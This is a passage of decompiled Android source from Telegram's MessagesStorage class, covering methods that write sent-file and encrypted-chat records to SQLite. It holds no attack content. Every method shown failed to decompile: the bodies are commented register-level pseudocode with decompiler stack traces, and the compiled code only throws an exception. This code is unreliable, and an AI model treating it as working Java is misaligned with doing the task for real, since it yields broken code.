                    r1 = move-exception;
                    org.telegram.messenger.FileLog.e(r1);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    if (r4 == 0) goto L_0x0028;
                L_0x0047:
                    r4.dispose();
                    goto L_0x0028;
                L_0x004b:
                    r5 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r5.database;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r6 = "REPLACE INTO sent_files_v2 VALUES(?, ?, ?)";	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r4 = r5.executeFast(r6);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r4.requery();	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r0 = new org.telegram.tgnet.NativeByteBuffer;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r3.getObjectSize();	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r0.<init>(r5);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r3.serializeToStream(r0);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = 1;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r4.bindString(r5, r2);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = 2;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r6 = r5;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r4.bindInteger(r5, r6);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = 3;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r4.bindByteBuffer(r5, r0);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r4.step();	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r0.reuse();	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                L_0x007b:
                    if (r4 == 0) goto L_0x0028;
                L_0x007d:
                    r4.dispose();
                    goto L_0x0028;
                L_0x0081:
                    r5 = move-exception;
                    if (r4 == 0) goto L_0x0087;
                L_0x0084:
                    r4.dispose();
                L_0x0087:
                    throw r5;
                    */
                    throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.59.run():void");
                }
            });
        }
    }

    public void updateEncryptedChatSeq(final TLRPC$EncryptedChat chat, final boolean cleanup) {
        if (chat != null) {
            this.storageQueue.postRunnable(new Runnable() {
                /* JADX WARNING: inconsistent code. */
                /* Code decompiled incorrectly, please refer to instructions dump. */
                public void run() {
                    /* JADX: method processing error */
/*
Error: jadx.core.utils.exceptions.JadxRuntimeException: Can't find block by offset: 0x0089 in list [B:6:0x0086]
	at jadx.core.utils.BlockUtils.getBlockByOffset(BlockUtils.java:43)
	at jadx.core.dex.instructions.IfNode.initBlocks(IfNode.java:60)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.initBlocksInIfNodes(BlockFinish.java:48)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.visit(BlockFinish.java:33)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
	at jadx.core.ProcessClass.process(ProcessClass.java:34)
	at jadx.core.ProcessClass.processDependencies(ProcessClass.java:56)
	at jadx.core.ProcessClass.process(ProcessClass.java:39)
	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)
	at jadx.api.JavaClass.decompile(JavaClass.java:62)
	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)
*/
                    /*
                    r10 = this;
                    r3 = 0;
                    r4 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = r4.database;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = "UPDATE enc_chats SET seq_in = ?, seq_out = ?, use_count = ?, in_seq_no = ?, mtproto_seq = ? WHERE uid = ?";	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3 = r4.executeFast(r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = 1;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5.seq_in;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3.bindInteger(r4, r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = 2;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5.seq_out;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3.bindInteger(r4, r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = 3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5.key_use_count_in;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5 << 16;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r6 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r6 = r6.key_use_count_out;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5 | r6;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3.bindInteger(r4, r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = 4;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5.in_seq_no;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3.bindInteger(r4, r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = 5;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5.mtproto_seq;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3.bindInteger(r4, r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = 6;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = r5.id;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3.bindInteger(r4, r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r3.step();	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = r4;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    if (r4 == 0) goto L_0x0084;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                L_0x004c:
                    r4 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = r4.id;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = (long) r4;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r6 = 32;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r0 = r4 << r6;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = r4.database;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = java.util.Locale.US;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r6 = "DELETE FROM messages WHERE mid IN (SELECT m.mid FROM messages as m LEFT JOIN messages_seq as s ON m.mid = s.mid WHERE m.uid = %d AND m.date = 0 AND m.mid < 0 AND s.seq_out <= %d)";	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r7 = 2;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r7 = new java.lang.Object[r7];	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r8 = 0;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r9 = java.lang.Long.valueOf(r0);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r7[r8] = r9;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r8 = 1;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r9 = r3;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r9 = r9.in_seq_no;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r9 = java.lang.Integer.valueOf(r9);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r7[r8] = r9;	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r5 = java.lang.String.format(r5, r6, r7);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = r4.executeFast(r5);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4 = r4.stepThis();	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    r4.dispose();	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                L_0x0084:
                    if (r3 == 0) goto L_0x0089;
                L_0x0086:
                    r3.dispose();
                L_0x0089:
                    return;
                L_0x008a:
                    r2 = move-exception;
                    org.telegram.messenger.FileLog.e(r2);	 Catch:{ Exception -> 0x008a, all -> 0x0094 }
                    if (r3 == 0) goto L_0x0089;
                L_0x0090:
                    r3.dispose();
                    goto L_0x0089;
                L_0x0094:
                    r4 = move-exception;
                    if (r3 == 0) goto L_0x009a;
                L_0x0097:
                    r3.dispose();
                L_0x009a:
                    throw r4;
                    */
                    throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.60.run():void");
                }
            });
        }
    }

    public void updateEncryptedChatTTL(final TLRPC$EncryptedChat chat) {
        if (chat != null) {
            this.storageQueue.postRunnable(new Runnable() {
                /* JADX WARNING: inconsistent code. */
                /* Code decompiled incorrectly, please refer to instructions dump. */
                public void run() {
                    /* JADX: method processing error */
/*
Error: jadx.core.utils.exceptions.JadxRuntimeException: Can't find block by offset: 0x0026 in list [B:4:0x0023]
	at jadx.core.utils.BlockUtils.getBlockByOffset(BlockUtils.java:43)
	at jadx.core.dex.instructions.IfNode.initBlocks(IfNode.java:60)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.initBlocksInIfNodes(BlockFinish.java:48)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.visit(BlockFinish.java:33)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
	at jadx.core.ProcessClass.process(ProcessClass.java:34)
	at jadx.core.ProcessClass.processDependencies(ProcessClass.java:56)
	at jadx.core.ProcessClass.process(ProcessClass.java:39)
	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)
	at jadx.api.JavaClass.decompile(JavaClass.java:62)
	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)
*/
                    /*
                    r4 = this;
                    r1 = 0;
                    r2 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r2 = r2.database;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = "UPDATE enc_chats SET ttl = ? WHERE uid = ?";	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1 = r2.executeFast(r3);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r2 = 1;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3.ttl;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1.bindInteger(r2, r3);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r2 = 2;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3.id;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1.bindInteger(r2, r3);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1.step();	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    if (r1 == 0) goto L_0x0026;
                L_0x0023:
                    r1.dispose();
                L_0x0026:
                    return;
                L_0x0027:
                    r0 = move-exception;
                    org.telegram.messenger.FileLog.e(r0);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    if (r1 == 0) goto L_0x0026;
                L_0x002d:
                    r1.dispose();
                    goto L_0x0026;
                L_0x0031:
                    r2 = move-exception;
                    if (r1 == 0) goto L_0x0037;
                L_0x0034:
                    r1.dispose();
                L_0x0037:
                    throw r2;
                    */
                    throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.61.run():void");
                }
            });
        }
    }

    public void updateEncryptedChatLayer(final TLRPC$EncryptedChat chat) {
        if (chat != null) {
            this.storageQueue.postRunnable(new Runnable() {
                /* JADX WARNING: inconsistent code. */
                /* Code decompiled incorrectly, please refer to instructions dump. */
                public void run() {
                    /* JADX: method processing error */
/*
Error: jadx.core.utils.exceptions.JadxRuntimeException: Can't find block by offset: 0x0026 in list [B:4:0x0023]
	at jadx.core.utils.BlockUtils.getBlockByOffset(BlockUtils.java:43)
	at jadx.core.dex.instructions.IfNode.initBlocks(IfNode.java:60)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.initBlocksInIfNodes(BlockFinish.java:48)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.visit(BlockFinish.java:33)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
	at jadx.core.ProcessClass.process(ProcessClass.java:34)
	at jadx.core.ProcessClass.processDependencies(ProcessClass.java:56)
	at jadx.core.ProcessClass.process(ProcessClass.java:39)
	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)
	at jadx.api.JavaClass.decompile(JavaClass.java:62)
	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)
*/
                    /*
                    r4 = this;
                    r1 = 0;
                    r2 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r2 = r2.database;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = "UPDATE enc_chats SET layer = ? WHERE uid = ?";	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1 = r2.executeFast(r3);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r2 = 1;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3.layer;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1.bindInteger(r2, r3);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r2 = 2;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r3 = r3.id;	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1.bindInteger(r2, r3);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    r1.step();	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    if (r1 == 0) goto L_0x0026;
                L_0x0023:
                    r1.dispose();
                L_0x0026:
                    return;
                L_0x0027:
                    r0 = move-exception;
                    org.telegram.messenger.FileLog.e(r0);	 Catch:{ Exception -> 0x0027, all -> 0x0031 }
                    if (r1 == 0) goto L_0x0026;
                L_0x002d:
                    r1.dispose();
                    goto L_0x0026;
                L_0x0031:
                    r2 = move-exception;
                    if (r1 == 0) goto L_0x0037;
                L_0x0034:
                    r1.dispose();
                L_0x0037:
                    throw r2;
                    */
                    throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.62.run():void");
                }
            });
        }
    }

    public void updateEncryptedChat(final TLRPC$EncryptedChat chat) {
        if (chat != null) {
            this.storageQueue.postRunnable(new Runnable() {
                /* JADX WARNING: inconsistent code. */
                /* Code decompiled incorrectly, please refer to instructions dump. */
                public void run() {
                    /* JADX: method processing error */
/*
Error: jadx.core.utils.exceptions.JadxRuntimeException: Can't find block by offset: 0x0150 in list [B:35:0x014d]
	at jadx.core.utils.BlockUtils.getBlockByOffset(BlockUtils.java:43)
	at jadx.core.dex.instructions.IfNode.initBlocks(IfNode.java:60)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.initBlocksInIfNodes(BlockFinish.java:48)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.visit(BlockFinish.java:33)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
	at jadx.core.ProcessClass.process(ProcessClass.java:34)
	at jadx.core.ProcessClass.processDependencies(ProcessClass.java:56)
	at jadx.core.ProcessClass.process(ProcessClass.java:39)
	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)
	at jadx.api.JavaClass.decompile(JavaClass.java:62)
	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)
*/
                    /*
                    r10 = this;
                    r9 = 16;
                    r7 = 1;
                    r6 = 0;
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.key_hash;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r8 == 0) goto L_0x0011;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x000a:
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.key_hash;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.length;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r8 >= r9) goto L_0x0023;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0011:
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r8 == 0) goto L_0x0023;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0017:
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r9 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r9 = r9.auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r9 = org.telegram.messenger.AndroidUtilities.calcAuthKeyHash(r9);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8.key_hash = r9;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0023:
                    r8 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.database;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r9 = "UPDATE enc_chats SET data = ?, g = ?, authkey = ?, ttl = ?, layer = ?, seq_in = ?, seq_out = ?, use_count = ?, exchange_id = ?, key_date = ?, fprint = ?, fauthkey = ?, khash = ?, in_seq_no = ?, admin_id = ?, mtproto_seq = ? WHERE uid = ?";	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6 = r8.executeFast(r9);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r0 = new org.telegram.tgnet.NativeByteBuffer;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.getObjectSize();	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r0.<init>(r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r1 = new org.telegram.tgnet.NativeByteBuffer;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.a_or_b;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r8 == 0) goto L_0x0151;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0043:
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.a_or_b;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.length;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0048:
                    r1.<init>(r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r2 = new org.telegram.tgnet.NativeByteBuffer;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r8 == 0) goto L_0x0154;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0053:
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.length;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0058:
                    r2.<init>(r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r3 = new org.telegram.tgnet.NativeByteBuffer;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.future_auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r8 == 0) goto L_0x0157;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0063:
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.future_auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.length;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0068:
                    r3.<init>(r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r4 = new org.telegram.tgnet.NativeByteBuffer;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.key_hash;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r8 == 0) goto L_0x0078;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0073:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.key_hash;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.length;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0078:
                    r4.<init>(r7);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7.serializeToStream(r0);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 1;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindByteBuffer(r7, r0);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.a_or_b;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r7 == 0) goto L_0x0091;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x008a:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.a_or_b;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r1.writeBytes(r7);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0091:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r7 == 0) goto L_0x009e;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x0097:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r2.writeBytes(r7);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x009e:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.future_auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r7 == 0) goto L_0x00ab;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x00a4:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.future_auth_key;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r3.writeBytes(r7);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x00ab:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.key_hash;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r7 == 0) goto L_0x00b8;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x00b1:
                    r7 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = r7.key_hash;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r4.writeBytes(r7);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                L_0x00b8:
                    r7 = 2;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindByteBuffer(r7, r1);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindByteBuffer(r7, r2);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 4;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.ttl;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 5;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.layer;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 6;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.seq_in;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 7;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.seq_out;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 8;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.key_use_count_in;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8 << 16;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r9 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r9 = r9.key_use_count_out;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8 | r9;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 9;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.exchange_id;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindLong(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 10;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.key_create_date;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 11;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.future_key_fingerprint;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindLong(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 12;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindByteBuffer(r7, r3);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 13;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindByteBuffer(r7, r4);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 14;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.in_seq_no;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 15;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
